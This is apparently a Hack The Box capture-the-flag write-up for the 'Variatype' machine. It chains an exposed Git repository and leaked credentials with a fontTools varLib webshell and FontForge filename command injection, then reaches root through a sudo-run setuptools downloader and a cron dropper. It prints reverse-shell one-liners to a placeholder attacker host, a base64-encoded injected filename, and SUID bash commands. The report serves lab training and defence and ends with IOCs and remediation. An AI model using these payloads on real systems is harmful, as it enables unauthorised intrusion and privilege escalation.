---
layout: writeup
title: "Variatype"
platform: HTB
os: "Linux"
date: 2026-03-16
techniques: ["Virtual host fuzzing","Exposed Git repository","Credential reuse","fontTools varLib arbitrary file write","Webshell deployment","FontForge filename command injection","Sudo abuse","Setuptools absolute-path write via URL encoding","Cron abuse","SUID shell"]
cve: ["CVE-2024-25081","CVE-2025-47273"]
description: "Exposed Git metadata on an internal portal led to credential recovery, which enabled portal access. A vulnerable fontTools varLib workflow was then abused to deploy a webshell, a FontForge filename injection bug pivoted access to steve, and a root-run Python plugin installer was abused for arbitrary file write to drop a cron job and gain root."
---

# Variatype - Technical Report

> **Platform:** Hack The Box  \
> **Difficulty:** `Medium`  \
> **OS:** `Linux`  \
> **Date:** 2026-03-16  \
> **Author:** 0N1S3C  \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The Variatype machine exposed a multi-stage compromise path across a public font generation service and an internal validation portal. An exposed Git repository on the internal portal disclosed credentials, which provided authenticated access to archived generator output. The main variable font generator was then abused through a vulnerable `fonttools varLib` processing flow to place a PHP webshell in a portal web directory, yielding code execution as `www-data`. Local enumeration revealed a secondary font-processing pipeline tied to FontForge; by weaponizing a ZIP archive with a crafted filename, code execution was obtained as the user `steve`. Finally, a misconfigured sudo rule allowed `steve` to execute a root-owned Python plugin installer that was vulnerable to arbitrary file write via URL-encoded absolute paths. This primitive was used to drop a cron file that created a SUID bash binary, resulting in full root compromise. Immediate remediation should focus on removing exposed source control metadata, patching unsafe file-processing dependencies, and revoking privileged workflows that consume untrusted input.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Variatype"** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root-level access

**Methodology:**
- Enumerate externally exposed services and hidden virtual hosts
- Review exposed source artifacts for credentials and implementation details
- Exploit unsafe file processing in font generation and validation workflows
- Perform post-exploitation enumeration and privilege escalation as appropriate

---

## 2. Attack Chain

```text
Recon → VHost fuzzing → portal.variatype.htb → Exposed .git → Recovered portal credentials → Portal access → fontTools varLib arbitrary file write → PHP webshell as www-data → FontForge filename command injection via ZIP → Reverse shell as steve → sudo install_validator.py → setuptools absolute-path file write → /etc/cron.d payload → SUID bash → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service detection |
| `ffuf` | Virtual host and content discovery |
| `curl` | HTTP interaction, manual testing, shell triggering |
| `git` | Reviewing exposed repository contents and history |
| `fontTools` | Building malicious fonts and designspace payloads |
| `python3` | Writing exploit helpers, payload servers, and shell upgrades |
| `nc` / `rlwrap` | Reverse shell listener and shell quality improvements |
| `ssh` | Post-exploitation access validation |
| `zipfile` / ZIP payloads | Delivering FontForge filename-based injection payloads |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -oA initial <target-ip>
nmap -sC -sV -p- -oA all_ports <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH | Standard admin access, initially no credentials |
| 80 | HTTP | nginx | Public web application and later-discovered internal portal |

**Key Observations:**
- The public site exposed a variable font generation workflow.
- File-processing behavior suggested Python-based tooling.
- The public application alone did not immediately yield a direct foothold, so virtual host discovery became the next priority.

### 4.2 Virtual Host Discovery

**Commands:**
```bash
ffuf -u http://<target-ip>/ -H "Host: FUZZ.variatype.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 169
```

**Findings:**
- `portal.variatype.htb`

**Key Observations:**
- The portal presented an authentication interface distinct from the public site.
- The target used name-based virtual hosting, so host file entries were required for accurate testing.

---

## 5. Service Enumeration

### 5.1 Public Web Application (`variatype.htb`)

**Tools Used:** `curl`, `ffuf`, manual inspection

**Findings:**
- The main application exposed a variable font generator accepting a `.designspace` file and one or more master fonts.
- The upload endpoint expected multipart form fields named `designspace` and `masters`.
- Basic malformed input produced only generic error messages.

### 5.2 Internal Portal (`portal.variatype.htb`)

**Tools Used:** `curl`, `ffuf`, `git`

**Findings:**
- The portal exposed an internal validation dashboard.
- An exposed `.git` directory was accessible over HTTP.
- Recovered repository history showed a credential committed and later removed from the working tree.

**Recovered Portal Credentials:**
- Username: `gitbot`
- Password: `G1tB0t_Acc3ss_2025!`

**Impact:**
- Successful login provided access to the dashboard and confirmed that generated fonts were archived under the portal web root.

### 5.3 Source Review and Internal Paths

After code recovery and local shell access, the following portal file paths were confirmed:

- `/var/www/portal.variatype.htb/public/index.php`
- `/var/www/portal.variatype.htb/public/dashboard.php`
- `/var/www/portal.variatype.htb/public/view.php`
- `/var/www/portal.variatype.htb/public/download.php`
- archive directory: `/var/www/portal.variatype.htb/public/files`

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Unsafe variable font generation using `fonttools varLib`  
**Location:** `/tools/variable-font-generator/process`  
**Reasoning:**

The Flask application behind the public site wrote uploaded master fonts into a temporary working directory, invoked `fonttools varLib config.designspace`, and copied one generated output file into the portal archive directory. Through crafted input, this workflow could be abused to produce a file containing attacker-controlled PHP code in a web-accessible location.

Relevant behavior later confirmed from `app.py`:
- `UPLOAD_FOLDER = '/tmp/variabype_uploads'`
- `DOWNLOAD_FOLDER = '/var/www/portal.variatype.htb/public/files'`
- `subprocess.run(['fonttools', 'varLib', 'config.designspace'], cwd=workdir, check=True, timeout=30)`

### 6.2 Exploitation

A malicious font/designspace payload was generated so that processing the uploaded files would result in a PHP webshell being written under the portal web root. Once deployed, the shell was accessible at:

- `/shell.php`

**Representative payload workflow:**
```bash
python3 exploit.py
curl "http://portal.variatype.htb/shell.php?c=id"
```

**Result:** User-level access obtained as `www-data`.

### 6.3 Shell Stabilization

The initial access path returned noisy, font-contaminated output. A proper reverse shell was triggered from the webshell to the attack host and upgraded into a TTY.

**Representative commands:**
```bash
# listener
rlwrap -cAr nc -lvnp 4444

# triggered from the webshell
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'

# tty upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
```

---

## 7. Lateral Movement

**From:** `www-data`  
**To:** `steve`

**Method:**
- Local enumeration uncovered a backup pipeline script at `/opt/process_client_submissions.bak`.
- The script processed files from `/var/www/portal.variatype.htb/public/files` and accepted `.zip` and `.sfd` files.
- It invoked FontForge on untrusted content.
- A crafted ZIP archive containing a malicious filename was uploaded into the watched directory.
- FontForge processed the file and executed the embedded command, leading to a reverse shell as `steve`.

### 7.1 Backup Pipeline Discovery

**Key file:** `/opt/process_client_submissions.bak`

**Important content:**
```bash
UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "... fontforge.open('$file') ..."
```

### 7.2 FontForge Exploitation

A ZIP archive was created locally with a dummy file whose filename executed a base64-decoded reverse shell when FontForge attempted to process it.

**Representative generation logic:**
```python
cmd = "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/5555 0>&1'"
b64 = base64.b64encode(cmd.encode()).decode()
payload_name = f"$(echo {b64}|base64 -d|bash).ttf"
```

The ZIP was placed into the pipeline input directory:

```bash
curl http://<attacker-ip>:8000/evil.zip -o /var/www/portal.variatype.htb/public/files/evil.zip
```

A callback was received as:
- `steve`

**Result:** Access obtained as `steve`.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l`
- [x] SUID binaries — `find / -perm -4000 -type f 2>/dev/null`
- [x] Cron jobs — `cat /etc/crontab`
- [x] Writable files/dirs
- [x] Capabilities — `getcap -r / 2>/dev/null`
- [x] Running processes / internal services
- [x] Bash history / config files review where accessible
- [ ] LinPEAS

**Key Findings:**
- `steve` could run the following command as root without a password:

```text
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

- The script used `setuptools.package_index.PackageIndex.download()` to retrieve a remote file.
- Normal URLs downloaded into `/opt/font-tools/validators/`.
- URL-encoded absolute paths using `%2f...` allowed arbitrary file write outside that directory.

### 8.2 Escalation Vector

**Vector:** Root arbitrary file write through `install_validator.py` → cron abuse  
**Root Cause:**

A root-run Python plugin installer accepted attacker-controlled URLs and used a vulnerable download mechanism that honored URL-encoded absolute output paths. This allowed arbitrary root-owned files to be written anywhere on the filesystem.

### 8.3 Proof of Arbitrary Write

A custom HTTP server was used to serve a simple proof file. The following command successfully wrote to `/tmp/proof.txt` as root:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  http://<attacker-ip>:8000/%2ftmp%2fproof.txt
cat /tmp/proof.txt
```

**Observed result:**
```text
pwned
```

### 8.4 Final Exploitation via Cron

A cron file was then served from the attacker host with the content:

```text
* * * * * root cp /bin/bash /tmp/rbash && chmod u+s /tmp/rbash
```

It was written as root to:
- `/etc/cron.d/steveroot`

**Command used:**
```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  http://<attacker-ip>:8000/%2fetc%2fcron.d%2fsteveroot
```

After the next cron execution, the following file appeared:
- `/tmp/rbash`

Executing it with `-p` yielded effective UID 0:

```bash
/tmp/rbash -p
id
cat /root/root.txt
```

**Result:** Root-level access achieved.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Exposed `.git` repository disclosed source history and valid credentials | 🔴 Critical | `portal.variatype.htb/.git/` |
| 2 | Unsafe `fonttools varLib` processing allowed attacker-controlled file write into a web-accessible directory | 🔴 Critical | Public font generator |
| 3 | Untrusted ZIP/font handling in a FontForge pipeline allowed command execution as a local user | 🔴 Critical | Internal font-processing workflow |
| 4 | Root-owned plugin installer allowed arbitrary file write via URL-encoded absolute paths | 🔴 Critical | `/opt/font-tools/install_validator.py` |
| 5 | Cron directory could be abused once arbitrary root file write was obtained | 🔴 Critical | `/etc/cron.d/` |
| 6 | Weak trust boundaries between upload handling, portal archiving, and privileged local tooling | 🟠 High | Application architecture |

**Severity Scale:**  
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- HTTP access to hidden virtual hosts such as `portal.variatype.htb`
- Unauthenticated retrieval of `.git` files over HTTP
- Suspicious uploads of crafted `.designspace`, ZIP, and font files
- Creation of unexpected files such as `shell.php` in web directories
- Reverse shell network connections from `www-data` or `steve`
- Unexpected use of `sudo /usr/bin/python3 /opt/font-tools/install_validator.py ...`
- Creation of `/etc/cron.d/steveroot`
- Creation of `/tmp/rbash` with the SUID bit set

### 10.2 Security Weaknesses

- Source control metadata exposed on a production-facing service
- Credentials stored in repository history
- Untrusted file formats processed with vulnerable font tooling
- Weak isolation between public uploads and internal validation pipelines
- Overly permissive sudo policy for a root-owned Python downloader
- Lack of containment around arbitrary file write impacts

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove `.git` directories and rotate all exposed credentials | Exposed source and credential disclosure |
| Immediate | Patch or replace vulnerable `fontTools`, FontForge, and affected setuptools components | Unsafe file-processing and downloader exploits |
| Immediate | Remove or strictly constrain the sudo rule for `install_validator.py` | Root arbitrary file write |
| Short-term | Isolate font-processing workflows in a sandbox/container with no privileged filesystem access | RCE through font processing |
| Short-term | Separate internal archive paths from public upload and processing paths | Trust boundary failure |
| Long-term | Add monitoring for unusual font submissions, webshell artifacts, and privileged file modifications | IOC coverage |

---

## 11. Lessons Learned

- This machine reinforced how dangerous chained low- to high-impact issues become when each workflow trusts the previous one.
- Several early exploit ideas were conceptually right but failed because the exact path, path encoding, or processing context was slightly off; persistence in validating assumptions mattered more than speed.
- The cleanest final escalation was not the flashiest one: once arbitrary root file write was confirmed, a simple cron dropper was more reliable than forcing SSH or trying to bend another service into cooperating.

---

## 12. Final Status

- **User flag obtained:** Yes  
- **Root flag obtained:** Yes  
- **Target fully compromised:** Yes

---

*End of Report*  
*Classification: Public — sensitive credentials, private keys, and full exploit artifacts may be redacted in shared versions.*
